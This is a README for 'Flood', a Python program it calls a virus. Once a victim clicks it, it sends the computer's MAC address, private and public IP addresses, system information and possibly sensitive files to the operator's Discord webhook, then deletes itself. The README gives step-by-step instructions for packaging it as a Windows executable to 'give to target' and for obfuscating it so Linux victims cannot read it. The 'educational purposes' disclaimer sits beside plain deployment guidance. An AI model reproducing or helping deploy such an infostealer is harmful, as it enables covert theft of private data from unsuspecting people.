
# Flood | Advanced Virus

Flood is a python3 advanced virus that once clicked will send info to your discord webhook listing information about the computer. 




## Features

- MAC Address
- Private IP
- Public IP
- System Information
- Possible Sensitive Files
- Auto deletes after execution complete


## Before Anything

Make sure in the script you change the webhook_url variable to your webhook url. I am also not responsible for any actions taken with this virus.
## Setup for windows target



```bash
pip3 install pyinstaller
pyinstaller --hidden-import 'requests' --onefile 'filename.py'
Give the exe file to target
```
    
## Setup for linux target

```bash
Go to the main.py script and change the webhook_url variable to your webhook url then do whats below

chmod +x obfuscate.sh
./obfuscate.sh

This will make the code unreadable but it will still run whats it suppposed too. 

Now all the target has to do is run python3 main.py and info of the target will be sent to your webhook
```

## Roadmap

- More info gathering



## Note

Made only for educational purposes.
